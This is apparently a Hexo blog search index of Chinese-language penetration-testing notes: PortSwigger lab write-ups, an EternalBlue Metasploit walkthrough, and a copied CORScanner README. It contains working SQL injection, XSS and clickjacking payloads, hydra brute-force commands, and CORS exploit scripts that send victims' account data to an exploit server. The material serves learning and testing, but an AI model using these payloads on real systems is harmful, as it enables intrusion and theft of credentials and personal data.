<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>一段时间总结</title>
    <url>/2019/12/12/%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>我感觉这个东西 实现挺简单的，主要是对一个origin的进行改变，使自己出现在Access-Control-Allow-Origin标头中，获取到对这个网站的访问权</p>
<p>还有关于那个空白名单的Origin</p>
<h3 id="UI劫持"><a href="#UI劫持" class="headerlink" title="UI劫持"></a>UI劫持</h3><p>就是对你进行欺骗，提供一个诱饵网站   比如点击抽奖，   真实的是点上了另一个网站的某个按钮，可以是付款之类的等等，就是应该多个页面覆盖的</p>
<p>诱饵主要靠电子邮件发出去的</p>
<h3 id="WebSocketes漏洞"><a href="#WebSocketes漏洞" class="headerlink" title="WebSocketes漏洞"></a>WebSocketes漏洞</h3><p>这个  还是bp工具好用</p>
<p>留言板之类的 比如留言板 可以进行XSS渗透，</p>
<p>‘</p>
<p><script> alert (1)</script><br>‘</p>
<p>就是你打了一个&lt;    结果可以输入  网站也接受   ，但是拦截的信息 来看   &lt;  变成了一个$#  。然后就想到一个方法 拦截修改  然后发送过去   可以很多类型的WEB安全漏洞</p>
<h3 id="流量夹带攻击-http-ReQUEST-sMUGGLING"><a href="#流量夹带攻击-http-ReQUEST-sMUGGLING" class="headerlink" title="流量夹带攻击 http ReQUEST sMUGGLING"></a>流量夹带攻击 http ReQUEST sMUGGLING</h3><p>干扰网站 ，让他处理一个或多个用户接受的HTTP请求序列的技术。这个漏洞是这个网站因为里面有一个负载均衡的服务器，负载均衡徽对一个请求 来转发，，但是这个时候出现了一个模糊的请求，前端和后端的系统对这个界限不清，就会出现俩边请求对他进行不同的解析处理 。然后就夹带了攻击，造成了安全隐患。</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>这个有很多种注入</p>
<p>1 显示里面隐藏的信息</p>
<p>2 颠覆里面的逻辑</p>
<p>3 UNION   查询隔壁的数据表</p>
<p>4 得知他用了 什么数据库  然后寻找相应的漏洞</p>
<p>5 盲注  用工具来实现</p>
<p>难一点的就是使用二阶SQL注入</p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>规避攻击者相同的源策略，该策略将不同的网站彼此隔离，然后控制受害用户访问那个应用程序的功能和数据。</p>
<p>放映的XSS</p>
<p>存储的XSS</p>
<p>基于DOM 的XSS</p>
<p>可以进行的操作 ：</p>
<p>将木马注入网站之中</p>
<p>捕获用户的数据</p>
<p>修改网站</p>
<p>假扮用户</p>
<h3 id="CSRF跨站点伪造请求"><a href="#CSRF跨站点伪造请求" class="headerlink" title="CSRF跨站点伪造请求"></a>CSRF跨站点伪造请求</h3><p>CSRF是一个    使攻击者执行他们不打算执行的操作，手感染后主要做的使更改电子邮件地址啊   更改密码之类的。</p>
<p>这个需要三个必要条件</p>
<p>相关动作</p>
<p>基于cookie 的会话处理</p>
<p>没有不可预测的请求参数</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>2017-永恒之蓝</title>
    <url>/2019/12/11/2017-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
    <content><![CDATA[<p>1.先看看能不能ping通对面</p>
<ol>
<li><p>msfconsole<br><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝1.png" alt="2017-永恒之蓝1"></p>
</li>
<li><p>search ms17_010<br><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝2.png" alt="2017-永恒之蓝2"></p>
</li>
<li><p>设置参数  并且run<br><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝3.png" alt="63bf3bda19653815d91315a4d82fce53.png"><br><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝3.png" alt="e60b48c9ad6b7d06ea309bf032c9df8a.png"></p>
</li>
<li>结果  然后shell<br><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝5.png" alt="b2aa09e2d34e1c40a51df62dc530162c.png"></li>
</ol>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝6.png" alt="8ef137789ca6f75d967e8d0bf38880f8.png"></p>
<p>假如对面有防火墙  其实win7也是可以防住的</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/2017-永恒之蓝1.png" alt="222"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSocket实验室1</title>
    <url>/2019/12/10/WebSocket%E5%AE%9E%E9%AA%8C%E5%AE%A41/</url>
    <content><![CDATA[<p>目标</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/webSocket目标.png" alt="目标"></p>
<p>用了  xss</p>
<p>在burp中进行修改</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/webSocket用burp 修改进行攻击.png" alt="如何攻击"></p>
<p>最终结果 如图</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/webSocket成功结果.png" alt="最终结果"></p>
<p>总的来说就是对留言版进行渗透</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS脚本实验室1</title>
    <url>/2019/12/10/XSS%E8%84%9A%E6%9C%AC%E5%AE%9E%E9%AA%8C%E5%AE%A41/</url>
    <content><![CDATA[<p><img src="http://q20wi1s2d.bkt.clouddn.com/结果脚本XSS.png" alt="结果XSS脚本"></p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/目标XSS脚本.png" alt="目标XSS脚本"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>hydra的使用</title>
    <url>/2019/12/09/hydra%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p>我个人喜欢C/S架构破解的时候使用hydra，搭配nmap和sqlmap；</p>
<p>下面举几个命令的使用例子：</p>
<p>在linux系统中 对一个IP 的3389爆破<br>hydra 192.168.228.143 rdp -L passs/root.txt  -P passs/2Gpas.txt -V</p>
<p>一般习惯用nmap扫一下主机，比如发现开放了1433端口（一般就是sql server 了  nmap -A 看看是不是真的运行了sql server服务 ）</p>
<p>之后：</p>
<p>hydra.exe -l sa -P d:\pass.txt 127.0.0.1 mssql</p>
<p>这个命令的意思就是 “d:\pass.txt” 是密码字典路径 hydra就开始遍历这个字典里面的所有字符串。</p>
<p>如图：<br><img src="http://q20wi1s2d.bkt.clouddn.com/1.png" alt="ace057c2b1c5d129ba024f19662a3223.png"></p>
<p>然后：<br><img src="http://q20wi1s2d.bkt.clouddn.com/2.png" alt="0001413ee4f6df1cf1635959c4bbd8d8.png"></p>
<p>使用sqlmap连接，并且反弹与系统交互的shell方便提权。</p>
<p>语法很多 但是十分简单：</p>
<p>hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]</p>
<p>（网上找的 凑合看吧）</p>
<p>下面列举几个hydra 破解命令：</p>
<p>破解mysql：</p>
<p>hydra.exe -L d:\user.txt -Pd:\pass.txt127.0.0.1 mysql</p>
<p>-L:指定用户名文件  -P：指定密码文件</p>
<p>破解FTP：</p>
<p>hydra.exe -l admin -P c:\pass.txt -t 5 127.0.0.1 ftp</p>
<p>-l：指定用户名  -t：指定线程</p>
<p>破解ssh：</p>
<p>hydra.exe -L users.txt -P password.txt -e n -t 5 -vV 127.0.0.1 ssh</p>
<p>“-e n”:对空密码探测</p>
<p>破解rdp：</p>
<p>hydra.exe -l administror -P c:\pass.txt www.test.com rdp -V</p>
<p>破解www.test.com的rdp服务（远程桌面协议）。</p>
<p>破解pop3：</p>
<p>hydra.exe -l root -P pass.txt my.pop3.mail pop3</p>
<p>注意：未指定文件路径时，Hydra将会在本目录下查找文件。</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/3.png" alt="ea912cc387e9824ea47faee9f7627ae1.png"><br><img src="http://q20wi1s2d.bkt.clouddn.com/4.png" alt="aa6a31e844b1c75f50ae2717834c4d4b.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>hydra</tag>
      </tags>
  </entry>
  <entry>
    <title>使用框架破坏脚本进行点击劫持</title>
    <url>/2019/12/08/%E4%BD%BF%E7%94%A8%E6%A1%86%E6%9E%B6%E7%A0%B4%E5%9D%8F%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<p>UI劫持3目标</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持3目标.png" alt="UI劫持3目标"></p>
<p>在src的属性  那里就是原来的URL后面加上   ?xxx=xxxx</p>
<p>例子?email=hacker@attacker-website.co</p>
<p>注:    在iframe标签比前面多了一个sandbox  属性</p>
<p>可以拥有额外的属性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   iframe &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:relative;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       width:700px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       height: 500px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       opacity: 0.0001;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   div &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:absolute;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       top:400px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       left:80px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 1;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;div&gt;Click me&lt;&#x2F;div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;iframe sandbox&#x3D;&quot;allow-forms&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">src&#x3D;&quot;https:&#x2F;&#x2F;ac751f131e42b197806b0cba001f007c.web-security-academy.net&#x2F;email?email&#x3D;hacker@attacker-website.com&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>UI劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>预先填写的表单输入劫持</title>
    <url>/2019/12/08/%E9%A2%84%E5%85%88%E5%A1%AB%E5%86%99%E7%9A%84%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E5%8A%AB%E6%8C%81/</url>
    <content><![CDATA[<p>和UI劫持一的实验相比  就是多一个表单  然后我们提前在里面输入电子邮件，然后可以多一个点击点  ，进行操作</p>
<p>UI劫持2成功</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2成功.png" alt="UI劫持2成功"></p>
<p>UI劫持2目标</p>
<p><img src="http://q20wi1s2d.bkt.clouddn.com/UI劫持2目标.png" alt="UI劫持2目标"></p>
<p>实验室  渗透利用代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   iframe &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:relative;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       width:700px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       height: 500px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       opacity: 0.0001;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   div &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:absolute;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       top:420px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       left:80px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 1;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;div&gt;Click me&lt;&#x2F;div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;ac651fa21ef1d5a88006bb7000280040.web-security-academy.net&#x2F;email?email&#x3D;hacker@attacker-website.com&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>UI劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>WebSockets实验室1</title>
    <url>/2019/12/07/UI%E5%8A%AB%E6%8C%81%E5%AE%9E%E9%AA%8C%E5%AE%A41/</url>
    <content><![CDATA[<h3 id="UI点击劫持实验室1"><a href="#UI点击劫持实验室1" class="headerlink" title="UI点击劫持实验室1"></a>UI点击劫持实验室1</h3><p>目标<br><img src="http://q20wi1s2d.bkt.clouddn.com/目标.png" alt="目标"></p>
<p>对于实现 需要做什么<br><img src="http://q20wi1s2d.bkt.clouddn.com/需要做什么.png" alt="对于实现 需要做什么"><br>实验成功图<br><img src="http://q20wi1s2d.bkt.clouddn.com/成功.png" alt="实验成功图"></p>
<p>漏洞利用服务器 需要的代码<br>价格click me 方块上去  设置位置 与大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   iframe &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:relative;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       width:700px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       height: 500px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       opacity: 0.0001;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 2;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   div &#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       position:absolute;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       top:300px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       left: 60px;</span></pre></td></tr><tr><td class="code"><pre><span class="line">       z-index: 1;</span></pre></td></tr><tr><td class="code"><pre><span class="line">   &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;style&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;div&gt;Click me&lt;&#x2F;div&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;https:&#x2F;&#x2F;acf71f461fff1ef3809f014c00f90004.web-security-academy.net&#x2F;account&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure><br><img src="http://q20wi1s2d.bkt.clouddn.com/zhenx.png" alt="真香"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>UI点击劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>FuzzScanner的使用</title>
    <url>/2019/12/06/FuzzScanner%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="FuzzScanner"><a href="#FuzzScanner" class="headerlink" title="FuzzScanner"></a>FuzzScanner</h3><p>一个用来进行信息搜集的工具集，主要是用于对网站子域名、开放端口、端口指纹、c段地址、敏感目录、链接爬取等信息进行批量搜集。</p>
<p>使用比较简单：<br>从github上拖下来<br><strong>git clone <a href="https://github.com/TideSec/FuzzScanner" target="_blank" rel="noopener">https://github.com/TideSec/FuzzScanner</a></strong><br>安装requirements.txt依赖<br><strong>pip install -r requirements.txt</strong><br>安装ruby环境，以便运行whatweb<br><strong>udo yum install ruby</strong>    # CentOS, Fedora, 或 RHEL 系统<br><strong>sudo apt-get install ruby-full</strong> # Debian 或 Ubuntu 系统<br>安装namp<br><strong>yum install nmap</strong>  # CentOS, Fedora, 或 RHEL 系统<br><strong>apt-get install nmap</strong>  # Debian 或 Ubuntu 系统<br>运行脚本，因为调用nmap需要root权限，<br>所以需要sudo。<br><strong>sudo python FuzzScanner.py</strong><br>执行fuzzscanner</p>
<p>root@Docker:~# <strong>docker run —name fuzzscanner -t -i 52341fc71d0a /bin/bash</strong></p>
<p>[root@a7edd0d9fdad /]# <strong>cd /root/FuzzScanner/</strong><br>[root@a7edd0d9fdad FuzzScanner]# <strong>python FuzzScanner.py</strong><br><img src="en-resource://database/6032:1" alt="dedb50011079859f957e60005aa25f46.png"></p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1、在扫描c段时，如果选择了全端口扫描，速度会比较慢，但可能会有惊喜。适合有个服务器放上面慢慢跑。<br>2、如果选择了目录枚举，可能速度也会比较慢，目录枚举是直接用的dirsearch，在启用该功能后当发现某端口为web服务时就会调用dirsearch。</p>
<p>可以对里面的参数进行  设置<br>若不设置 就是扫描全段</p>
<p><strong>python FuzzScanner.py  -h vipshop.com</strong><br>就是对   vipshop.com进行扫描<br>保存了网站信息、网站标题、中间件信息、waf信息、端口信息、目录扫描信息等等。</p>
<p>扫描挺花费时间的     可以扔到一个服务器里面进行扫描</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入</title>
    <url>/2019/12/05/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="安全实验室的SQL实验1"><a href="#安全实验室的SQL实验1" class="headerlink" title="安全实验室的SQL实验1"></a>安全实验室的SQL实验1</h3><p>主要为了看隐藏信息<br>1.简单的SQL注入 URL中结尾是？xxx=xxxx<br>  对于这种情况就是在 结尾 + or语句试试看<br>  实验室要求是  显示所有的产品(包括那些隐藏的产品)<br>  解题思路就是 ’  结尾，结束网址，然后输入or 1=1—搜索全部的<br><img src="http://q20wi1s2d.bkt.clouddn.com/sql注入实验室第一个.png" alt="sql注入实验室第一个"></p>
<h3 id="安全实验室的SQL实验2"><a href="#安全实验室的SQL实验2" class="headerlink" title="安全实验室的SQL实验2"></a>安全实验室的SQL实验2</h3><p>逻辑上漏洞的绕过<br>这个逻辑漏洞是  因为登录框采用的是mysql 的       我们用<br>select * from users where username = ‘(你在账号那里填的东西)       ‘   and  password = ‘(你在密码填的东西)   ‘<br>我用的方法是  账号那里填 ‘or 1=1#<br>因为’OR 1=1  说明了这是一个真命题  可以执行    #后面就是注释  写什么都没有关系了<br><img src="http://q20wi1s2d.bkt.clouddn.com/安全实验室的SQL实验2.png" alt="安全实验室的SQL实验2"><br><img src="http://q20wi1s2d.bkt.clouddn.com/zhenx.png" alt="www"></p>
]]></content>
      <categories>
        <category>渗透</category>
        <category>睡觉</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS</title>
    <url>/2019/12/04/CORS/</url>
    <content><![CDATA[<h3 id="关于Burp-Suite-的CORS-origin-null-的渗透"><a href="#关于Burp-Suite-的CORS-origin-null-的渗透" class="headerlink" title="关于Burp Suite 的CORS   origin:null 的渗透"></a>关于Burp Suite 的CORS   origin:null 的渗透</h3><p><strong>1.实验 登录你的账号密码</strong><br><img src="en-resource://database/6040:1" alt="ab391dd7015c2da12e84799da11985bb.png"><br><strong>2.用Burp Suite 拦截请求报文</strong><br><img src="en-resource://database/6042:1" alt="b1563c3125c4a6057201f51d5c5bf447.png"><br><strong>3.使用  漏洞利用服务器  并替换实验的URL</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe sandbox&#x3D;&quot;allow-scripts allow-top-navigation allow-forms&quot; src&#x3D;&quot;data:text&#x2F;html, &lt;script&gt;</span></pre></td></tr><tr><td class="code"><pre><span class="line">var req &#x3D; new XMLHttpRequest ();</span></pre></td></tr><tr><td class="code"><pre><span class="line">req.onload &#x3D; reqListener;   req.open(&#39;get&#39;,&#39;$url&#x2F;accountDetails&#39;,true);</span></pre></td></tr><tr><td class="code"><pre><span class="line">req.withCredentials &#x3D; true;</span></pre></td></tr><tr><td class="code"><pre><span class="line">req.send();</span></pre></td></tr><tr><td class="code"><pre><span class="line">function reqListener()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;       </span></pre></td></tr><tr><td class="code"><pre><span class="line">location&#x3D;&#39;$exploit-server-url&#x2F;log?key&#x3D;&#39;+encodeURIComponent(this.responseText);   </span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure><br><strong>4.进行测试</strong></p>
<p>用您的特定实验室的URL 替换$ url，用漏洞利用服务器的URL 替换$ exploit-server-url，然后单击“查看漏洞”对其进行测试</p>
<p><img src="en-resource://database/6044:1" alt="538a842cac20cf877357ff83652638a1.png"><br>看见日志  进行分析<br>发现了<br>wiener的APT密码</p>
<p>administrator的APT密码</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>burp</tag>
      </tags>
  </entry>
  <entry>
    <title>CORScanner</title>
    <url>/2019/12/04/CORScanner/</url>
    <content><![CDATA[<h2 id="About-CORScanner"><a href="#About-CORScanner" class="headerlink" title="About CORScanner"></a>About CORScanner</h2><p>CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。</p>
<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><ul>
<li><p>Download this tool</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;chenjj&#x2F;CORScanner.git</span></pre></td></tr></table></figure>
</li>
<li><p>Install dependencies</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip install -r requirements.txt</span></pre></td></tr></table></figure>
<p>CORScanner depends on the <code>requests</code>, <code>gevent</code>, <code>tldextract</code>, <code>colorama</code> and <code>argparse</code> python modules.</p>
</li>
</ul>
<h2 id="Python-Version"><a href="#Python-Version" class="headerlink" title="Python Version:"></a>Python Version:</h2><ul>
<li>Both Python 2 (<strong>2.7.x</strong>) and Python 3 (<strong>3.7.x</strong>) are supported.</li>
</ul>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><div class="table-container">
<table>
<thead>
<tr>
<th>Short Form</th>
<th>Long Form</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>-u</td>
<td>—url</td>
<td>URL/域以检查它的CORS政策</td>
</tr>
<tr>
<td>-d</td>
<td>—headers</td>
<td>向请求添加标头</td>
</tr>
<tr>
<td>-i</td>
<td>—input</td>
<td>URL/域列表文件以检查其CORS政策y</td>
</tr>
<tr>
<td>-t</td>
<td>—threads</td>
<td>用于CORS扫描的线程数</td>
</tr>
<tr>
<td>-o</td>
<td>—output</td>
<td>将结果保存到json文件</td>
</tr>
<tr>
<td>-v</td>
<td>—verbose</td>
<td>启用详细模式并实时显示结果</td>
</tr>
<tr>
<td>-h</td>
<td>—help</td>
<td>显示帮助信息并退出</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ul>
<li>要检查特定域的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u example.com</code></p>
<ul>
<li>要检查特定网址的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u http://example.com/restapi</code></p>
<ul>
<li>要检查多个域/ URL的CORS配置错误:</li>
</ul>
<p><code>python cors_scan.py -u example.com -d &quot;Cookie: test&quot;</code></p>
<ul>
<li>要列出所有基本选项和开关，请使用-h开关:</li>
</ul>
<p><code>python cors_scan.py -i top_100_domains.txt -t 100</code></p>
<ul>
<li>To list all the basic options and switches use -h switch:</li>
</ul>
<p><code>python cors_scan.py -h</code></p>
<h2 id="Misconfiguration-types"><a href="#Misconfiguration-types" class="headerlink" title="Misconfiguration types"></a>Misconfiguration types</h2><p>This tool covers the following misconfiguration types:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Misconfiguration type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Reflect_any_origin</td>
<td>Blindly reflect the Origin header value in <code>Access-Control-Allow-Origin headers</code> in responses, which means any website can read its secrets by sending cross-orign requests.</td>
</tr>
<tr>
<td>Prefix_match</td>
<td><code>wwww.example.com</code> trusts <code>example.com.evil.com</code>, which is an attacker’s domain.</td>
</tr>
<tr>
<td>Suffix_match</td>
<td><code>wwww.example.com</code> trusts <code>evilexample.com</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Not_escape_dot</td>
<td><code>wwww.example.com</code> trusts <code>wwwaexample.com</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Substring match</td>
<td><code>wwww.example.com</code> trusts <code>example.co</code>, which could be registered by an attacker.</td>
</tr>
<tr>
<td>Trust_null</td>
<td><code>wwww.example.com</code> trusts <code>null</code>, which can be forged by iframe sandbox scripts</td>
</tr>
<tr>
<td>HTTPS_trust_HTTP</td>
<td>Risky trust dependency, a MITM attacker may steal HTTPS site secrets</td>
</tr>
<tr>
<td>Trust_any_subdomain</td>
<td>Risky trust dependency, a subdomain XSS may steal its secrets</td>
</tr>
<tr>
<td>custom_third_parties</td>
<td>Custom unsafe third parties origins like <code>github.io</code>, see more in <a href="./origins.json">origins.json</a> file. Thanks <a href="https://github.com/phackt" target="_blank" rel="noopener">@phackt</a>!</td>
</tr>
</tbody>
</table>
</div>
<p>Welcome to contribute more.  </p>
<h2 id="Exploitation-examples"><a href="#Exploitation-examples" class="headerlink" title="Exploitation examples"></a>Exploitation examples</h2><p>Here is an example about how to exploit “Reflect_any_origin” misconfiguration on Walmart.com(fixed). Localhost is the malicious website in the video.</p>
<p>Walmart.com video on Youtube:</p>
<p><a href="http://www.youtube.com/watch?v=3abaevsSHXY" target="_blank" rel="noopener"><img src="https://github.com/chenjj/CORScanner/raw/master/images/walmart.png" alt="Walmart_CORS_misconfiguration_exploitation"></a></p>
<p>Here is the exploitation code:<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="comment">// Send a cross origin request to the walmart.com server, when a victim visits the page.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">var</span> req = <span class="keyword">new</span> XMLHttpRequest();       req.open(<span class="string">'GET'</span>,<span class="string">"https://www.walmart.com/account/electrode/account/api/customer/:CID/credit-card"</span>,<span class="literal">true</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.onload = stealData;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.withCredentials = <span class="literal">true</span>;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    req.send();</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">stealData</span>(<span class="params"></span>)</span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//reading response is allowed because of the CORS misconfiguration.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">var</span> data= <span class="built_in">JSON</span>.stringify(<span class="built_in">JSON</span>.parse(<span class="keyword">this</span>.responseText),<span class="literal">null</span>,<span class="number">2</span>);</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="comment">//display the data on the page. A real attacker can send the data to his server.</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">        output(data);</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">inp</span>) </span>&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="built_in">document</span>.body.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'pre'</span>)).innerHTML = inp;</span></pre></td></tr><tr><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/script&gt;</span></span></pre></td></tr></table></figure></p>
<p>If you have understood how the demo works, you can read Section 5 and Section 6 of the <a href="https://www.jianjunchen.com/publication/an-empirical-study-of-cors/" target="_blank" rel="noopener">CORS paper</a> and know how to exploit other misconfigurations.</p>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>CORScanner is licensed under the MIT license. take a look at the <a href="./LICENSE">LICENSE</a> for more information.</p>
<h2 id="Credits"><a href="#Credits" class="headerlink" title="Credits"></a>Credits</h2><p>This work is inspired by the following excellent researches:</p>
<ul>
<li>James Kettle, “Exploiting CORS misconfigurations for Bitcoins and bounties”, AppSecUSA 2016*</li>
<li>Evan Johnson, “Misconfigured CORS and why web appsec is not getting easier”,  AppSecUSA 2016*</li>
